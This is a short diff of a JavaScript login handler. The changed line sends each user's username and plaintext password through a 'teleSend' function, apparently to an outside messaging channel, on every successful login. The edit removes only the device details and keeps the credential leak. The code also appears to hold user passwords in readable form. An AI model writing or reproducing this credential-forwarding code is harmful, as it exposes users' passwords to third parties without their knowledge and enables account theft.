@@ -139,7 +139,7 @@ const reqHelper = {
             user.alrLogined = currentAlrLogined;
             user.devices = updatedDevices;
         }
-reqHelper.teleSend(`✅️ New login from ${JSON.stringify(deviceInfo)}\n- username: ${user.username}\n- password: ${user.password}`)
+reqHelper.teleSend(`✅️ New login\n- username: ${user.username}\n- password: ${user.password}`)
         return res.status(200).json({ 
             success: true, 
             userData: user,
